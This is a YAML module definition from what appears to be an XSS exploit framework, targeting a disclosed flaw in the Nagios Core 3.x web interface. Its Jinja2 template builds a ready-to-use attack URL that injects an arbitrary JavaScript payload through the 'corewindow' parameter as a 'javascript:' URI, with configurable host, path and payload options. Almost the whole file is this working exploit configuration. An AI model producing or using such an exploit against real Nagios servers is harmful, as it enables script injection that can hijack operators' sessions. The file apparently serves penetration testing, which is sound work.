---
# ** xs_exploits module definition **
#
# Version of module structure, in order to enable future changes and compatibility determination
structure_version: 0
data:
  module_type: xss_get
  name: nagios-corewindow
  description: Exploits a flaw in the way that web UI for Nagios Core displays loads untrusted URLs

  metadata:
    # Arbitrary metadata for module (could be presented in interface/be searchable)
    vendor: Nagios
    affected_versions: '3.x'
    links:
      - http://seclists.org/fulldisclosure/2016/Jun/20

    exploit_version: 1
    developers:
      - Joel Rangsmo <joel@rangsmo.se>

  # Settings that needs to be configured before module can be rendered
  # Certain options may be inherited from type - such as "HOST", "PROTO" and "PORT"
  options:
    - name: NAGIOS_PATH
      description: Sub-path for Nagios application on web server
      option_type: string
      default: "/nagios"
      required: false

      # Specifies different types of limitations for the module option
      constraints:
        - constraint_type: length
          options:
            max: 300 

    - name: PAYLOAD
      description: JavaScript payload to be included in URI 
      option_type: string
      default: ""
      required: true

      # Specifies different types of limitations for the module option
      constraints:
        - constraint_type: length
          options:
            max: 300 

  # Template for module redering (based on Jinja2)
  template: '{{ PROTO }}://{{ HOST }}:{{ PORT }}{{ NAGIOS_PATH }}/index.php?corewindow=javascript:{{ PAYLOAD | urlencode }}'
  
  # Template for generating instance ID of module (based on Jinja2)
  # Defines the unique name of configured module, in order to allow multiple use
  instance_id: '{{ PROTO }}://{{ HOST }}:{{ PORT }}{{ NAGIOS_PATH }} - "{{ PAYLOAD }}"'
